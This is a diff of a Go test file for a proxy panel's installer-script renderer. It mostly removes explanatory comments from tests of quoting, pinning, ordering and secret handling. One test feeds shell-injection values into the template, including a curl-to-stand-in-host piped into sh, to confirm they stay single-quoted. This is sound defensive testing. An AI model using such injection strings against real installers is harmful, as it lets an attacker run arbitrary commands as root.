@@ -20,8 +20,6 @@ func TestRenderContainsEssentials(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	// Every substituted value is single-quoted by the sq template func, so the expectations
-	// are on the quoted forms.
 	for _, want := range []string{
 		"#!/usr/bin/env bash", `REG_URL="$PANEL_URL/api/v1/install/$INSTALL_TOKEN/register"`, "--hostname 'n.test'",
 		"git -C", "checkout -q 'abc'", "init-node", "--max-profiles 128", "sha256sum -c", "tgwp-agent.service", "base64 -d | tar",
@@ -33,8 +31,6 @@ func TestRenderContainsEssentials(t *testing.T) {
 	}
 }
 
-// TestRenderQuotesShellMetacharacters is the I2 regression test: a hostile value reaching a
-// substitution point must stay inside its single quotes rather than becoming a command.
 func TestRenderQuotesShellMetacharacters(t *testing.T) {
 	out, err := Render(Params{
 		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test",
@@ -47,8 +43,6 @@ func TestRenderQuotesShellMetacharacters(t *testing.T) {
 	if !strings.Contains(out, `ACME_EMAIL='x"; curl http://evil/x | sh; #'`) {
 		t.Errorf("payload not single-quoted:\n%s", out)
 	}
-	// A value containing a single quote must be closed/escaped/reopened, never left to
-	// terminate the quoting.
 	out, err = Render(Params{
 		PanelURL: "https://p.test", InstallToken: "tok", Hostname: "n.test", ACMEEmail: `a'; id; '`,
 		Secret: "0", TProxyCommit: "abc", AgentSHA256: "d", Site: FallbackSite(),
@@ -162,10 +156,6 @@ func TestRenderTelemtBranch(t *testing.T) {
 	}
 }
 
-// I1: telemt learns the TLS fingerprint of its tls_domain from a real handshake on 443 at
-// startup, and a runtime reload refuses to activate a generation whose TLS-front profile is
-// still the built-in fallback. Caddy must therefore be up, with a certificate, before telemt
-// starts - and the installer must fail loudly rather than exit 0 when it never gets one.
 func TestRenderTelemtStartsCaddyBeforeTelemt(t *testing.T) {
 	out, err := Render(telemtParams())
 	if err != nil {
@@ -202,8 +192,6 @@ func TestRenderTelemtStartsCaddyBeforeTelemt(t *testing.T) {
 	}
 }
 
-// TestRenderRefusesUnpinnedTelemt: the tarball is fetched over the network and executed as
-// root, so an unset or malformed pin must fail in the panel, not on the node.
 func TestRenderRefusesUnpinnedTelemt(t *testing.T) {
 	for name, mutate := range map[string]func(*Params){
 		"empty sha":     func(p *Params) { p.TelemtSHA256 = "" },
@@ -227,8 +215,6 @@ func TestRenderRefusesUnpinnedTelemt(t *testing.T) {
 	}
 }
 
-// TestRenderTelemtDefaults: nodes created before tls_domain/classic_port existed carry empty
-// values; the script must still be a valid one.
 func TestRenderTelemtDefaults(t *testing.T) {
 	p := telemtParams()
 	p.TLSDomain, p.ClassicPort = "", 0
@@ -241,8 +227,6 @@ func TestRenderTelemtDefaults(t *testing.T) {
 	}
 }
 
-// TestRenderPublicIP: the operator's public_ip travels into the script (quoted like every
-// other value) and the script prefers it over detection.
 func TestRenderPublicIP(t *testing.T) {
 	p := telemtParams()
 	p.PublicIP = "203.0.113.10"
@@ -261,11 +245,6 @@ func TestRenderPublicIP(t *testing.T) {
 	}
 }
 
-// TestRenderPublicIPDetection: without an explicit value the script collects two candidates
-// (the outbound interface, the address api.ipify.org reports) and chooses between them by the
-// hostname's A record, then by whether the interface address is a public one. Both engine
-// branches carry the same block. The behaviour itself is exercised by
-// deploy/test-node-preflight.sh (cases nat-dns and nat-mismatch) with stubbed ip/curl.
 func TestRenderPublicIPDetection(t *testing.T) {
 	for name, out := range bothBranches(t) {
 		for _, want := range []string{
@@ -320,8 +299,6 @@ func writeScripts(t *testing.T) map[string]string {
 	return paths
 }
 
-// TestRenderedScriptsAreValidBash runs `bash -n` over both branches: the script is piped
-// straight into a root shell, so a syntax error is a broken install, not a test failure.
 func TestRenderedScriptsAreValidBash(t *testing.T) {
 	bash, err := exec.LookPath("bash")
 	if err != nil {
@@ -334,8 +311,7 @@ func TestRenderedScriptsAreValidBash(t *testing.T) {
 	}
 }
 
-// TestRenderedScriptsPassShellcheck: both branches must be shellcheck-clean. Directives are
-// allowed in the template when they carry a comment saying why. Skipped without shellcheck.
+// TestRenderedScriptsPassShellcheck: both branches must be shellcheck-clean.
 func TestRenderedScriptsPassShellcheck(t *testing.T) {
 	sc, err := exec.LookPath("shellcheck")
 	if err != nil {
@@ -352,8 +328,6 @@ func TestRenderedScriptsPassShellcheck(t *testing.T) {
 	}
 }
 
-// Task 50: the pre-flight block runs before anything is installed, in both branches, and
-// its menu / escape hatches are present.
 func TestRenderPreflight(t *testing.T) {
 	for name, out := range bothBranches(t) {
 		for _, want := range []string{
@@ -398,8 +372,6 @@ func TestRenderPreflight(t *testing.T) {
 	}
 }
 
-// Task 50: registration consumes the single-use install token, so it must come after every
-// readiness wait; agent.env (which needs the node token) and the agent start come after it.
 func TestRenderRegistersAfterReadiness(t *testing.T) {
 	for name, out := range bothBranches(t) {
 		caddyWait := strings.Index(out, `wait_for "certificate for $NODE_HOSTNAME" 120 caddy_ready`)
@@ -458,9 +430,6 @@ func TestRenderOutputStyle(t *testing.T) {
 	}
 }
 
-// TestRenderNeverPrintsSecrets: no echo/printf/ok/fail/warn/info/die/banner line may carry
-// the web secret, the install token, the node token, the telemt API token or the raw
-// registration response, by variable name or by value.
 func TestRenderNeverPrintsSecrets(t *testing.T) {
 	const secret, token = "SECRET-0123456789abcdef0123456789abcdef", "INSTALL-TOKEN-fedcba9876543210"
 	printers := regexp.MustCompile(`^\s*(echo|printf|ok|fail|warn|info|die|pf_ok|pf_fail|pf_warn|banner|banner_ok|banner_fail)\s`)
@@ -494,9 +463,6 @@ func TestRenderNeverPrintsSecrets(t *testing.T) {
 	}
 }
 
-// Task 46b: the installer writes the MEKO network tuning to /etc/sysctl.d in both engine
-// branches, right after the apt dependencies and before Caddy, and never lets a kernel that
-// rejects a key (containers, old kernels) abort the install.
 func TestRenderWritesSysctlTuning(t *testing.T) {
 	wantKeys := []string{
 		"# TGProxy panel: network tuning for proxy nodes (adopted from MTPROTO_FIX_By_MEKO)",
